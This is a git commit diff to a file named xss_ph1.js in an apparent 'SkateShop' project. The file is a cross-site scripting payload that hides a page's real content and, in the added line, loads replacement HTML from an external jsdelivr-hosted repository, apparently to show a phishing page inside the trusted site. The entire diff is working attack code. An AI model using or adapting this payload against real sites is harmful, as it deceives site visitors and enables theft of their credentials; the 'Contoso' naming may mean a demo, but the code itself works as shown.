c5094f6501b4e0850e787ed09af96451093ffa88
Tom <hot@microsoft.com>
2020-08-24 12:20:27 +0800

    ph1

--- SkateShop/xss_ph1.js
+++ SkateShop/xss_ph1.js
@@ -1,13 +1,14 @@
 // Hide initial content
 $(".row, .subheader").css("display", "none");
 
+// Add place holder
 var place_holder = document.createElement('div');
 place_holder.className = "place_holder";
-
 $("nav").after(place_holder);
+
 $(window).on('load', function() {
     // Remove all unwanted content
     $(".row").remove();
-
+    $('.place_holder').load("https://cdn.jsdelivr.net/gh/hotMS/Contoso-Stake/SkateShop/xss_ph.html");
     console.log("done");
 });
